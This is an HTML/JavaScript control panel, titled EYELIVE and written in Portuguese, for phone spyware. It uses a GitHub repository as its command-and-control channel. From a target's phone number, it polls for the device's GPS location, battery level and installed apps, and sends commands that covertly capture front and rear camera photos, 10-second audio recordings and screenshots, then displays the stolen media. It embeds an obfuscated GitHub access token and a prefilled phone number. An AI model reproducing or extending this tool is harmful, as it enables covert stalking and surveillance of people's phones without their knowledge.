<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#fff;font-family:monospace;min-height:100vh}
        .header{background:#000;padding:20px;text-align:center;border-bottom:2px solid #ffd700}
        .header h1{color:#ffd700;font-size:1.5em;letter-spacing:3px}
        .container{max-width:500px;margin:0 auto;padding:20px}
        .card{background:#111;border:1px solid #222;border-radius:15px;padding:20px;margin:15px 0}
        input{width:100%;padding:15px;background:#000;border:1px solid #333;color:#fff;border-radius:10px;font-size:1.1em;text-align:center;margin:8px 0}
        .btn{width:100%;padding:15px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:1em;margin:5px 0;text-transform:uppercase}
        .btn-gold{background:#ffd700;color:#000}.btn-green{background:#00ff88;color:#000}.btn-red{background:#ff4400;color:#fff}
        .result{background:#000;border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;min-height:80px;font-size:.85em;color:#aaa;word-break:break-all;max-height:300px;overflow-y:auto}
        .result img{width:100%;border-radius:8px;margin:10px 0}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
        .dot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:5px}
        .on{background:#00ff88}.off{background:#ff4444}
    </style>
</head>
<body>
<div class="header"><h1>EYELIVE</h1></div>
<div class="container">
    <div class="card" id="card1">
        <h2 style="color:#ffd700;margin-bottom:15px">🔍 Buscar Dispositivo</h2>
        <input type="text" id="numero" placeholder="Numero: 62996942287" value="62996942287" autofocus>
        <button class="btn btn-gold" onclick="conectar()">🔗 Conectar</button>
    </div>
    <div class="card" id="card2" style="display:none">
        <h2 style="color:#ffd700;margin-bottom:15px" id="titulo">📱 Dispositivo</h2>
        <div class="result" id="status"></div>
        <div class="grid">
            <button class="btn btn-green" onclick="cmd('foto_frontal')">📸 Frontal</button>
            <button class="btn btn-green" onclick="cmd('foto_traseira')">📸 Traseira</button>
            <button class="btn btn-red" onclick="cmd('audio')">🎤 Audio 10s</button>
            <button class="btn btn-gold" onclick="cmd('screenshot')">📱 Tela</button>
        </div>
        <button class="btn btn-gold" onclick="cmd('status')">🔄 Atualizar Status</button>
    </div>
    <div class="result" id="media"></div>
</div>
<script>
function decToken(){
    var t="now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da";var r="";
    for(var i=0;i<t.length;i++){
        var c=t[i];
        if(c.match(/[a-zA-Z]/)){var b=c===c.toUpperCase()?65:97;r+=String.fromCharCode((c.charCodeAt(0)-b-7+26)%26+b)}
        else{r+=c}
    }
    return r;
}
var T=decToken();
var ID='';
var REPO='gynbetfc/eyelive';
var H={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'};
var INTERVAL=null;

function hash(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return Math.abs(h).toString(16).substring(0,12)}

async function conectar(){
    var n=document.getElementById('numero').value.replace(/[^0-9]/g,'');
    if(!n)return alert('Digite o numero!');
    ID=hash(n);
    document.getElementById('titulo').textContent='📱 '+n+' ('+ID+')';
    document.getElementById('card1').style.display='none';
    document.getElementById('card2').style.display='block';
    atualizarStatus();
    if(INTERVAL)clearInterval(INTERVAL);
    INTERVAL=setInterval(atualizarStatus,8000);
    localStorage.setItem('eyelive_num',n);
}

async function atualizarStatus(){
    try{
        var r=await fetch('https://api.github.com/repos/'+REPO+'/contents/dados/'+ID+'/status.json',{headers:H});
        if(r.ok){
            var d=await r.json();
            var s=JSON.parse(atob(d.content));
            document.getElementById('status').innerHTML='<p><span class="dot on"></span> <b>Online</b> | 🕐 '+s.time+'</p><p>🔋 '+s.bateria+' | 📍 '+JSON.stringify(s.gps)+'</p><p>📱 '+(s.apps||[]).join(', ')+'</p>';
        }else{
            document.getElementById('status').innerHTML='<p><span class="dot off"></span> Aguardando dados...</p>';
        }
    }catch(e){}
}

async function cmd(c){
    try{
        var data={cmd:c,target:ID};
        var content=btoa(JSON.stringify(data));
        var url='https://api.github.com/repos/'+REPO+'/contents/comandos/'+ID+'.json';
        
        var check=await fetch(url,{headers:H});
        var body={message:c,content:content,branch:'main'};
        if(check.ok)body.sha=(await check.json()).sha;
        await fetch(url,{method:'PUT',headers:H,body:JSON.stringify(body)});
        
        document.getElementById('media').innerHTML='⏳ Comando <b>'+c+'</b> enviado! Aguardando resposta (15s)...';
        
        setTimeout(async function(){
            var r2=await fetch('https://api.github.com/repos/'+REPO+'/contents/dados/'+ID,{headers:H});
            if(r2.ok){
                var lista=await r2.json();
                var resp=null;
                lista.forEach(function(f){
                    if(f.name.includes(c)&&f.name.endsWith('.json'))resp=f;
                });
                if(resp){
                    var rd=await fetch(resp.url,{headers:H});
                    var data=await rd.json();
                    var r=JSON.parse(atob(data.content));
                    var h='<p>✅ <b>'+r.cmd+'</b> recebido!</p>';
                    if(r.result&&r.result.length>100){
                        if(r.cmd.includes('foto')||r.cmd.includes('screen'))h+='<img src="data:image/jpeg;base64,'+r.result+'" onclick="window.open(this.src)">';
                        else if(r.cmd=='audio')h+='<audio controls src="data:audio/aac;base64,'+r.result+'"></audio>';
                    }else{h+=JSON.stringify(r)}
                    document.getElementById('media').innerHTML=h;
                }
            }
        },15000);
    }catch(e){document.getElementById('media').innerHTML='❌ Erro: '+e.message}
}

var s=localStorage.getItem('eyelive_num');if(s)document.getElementById('numero').value=s;
</script>
</body>
</html>
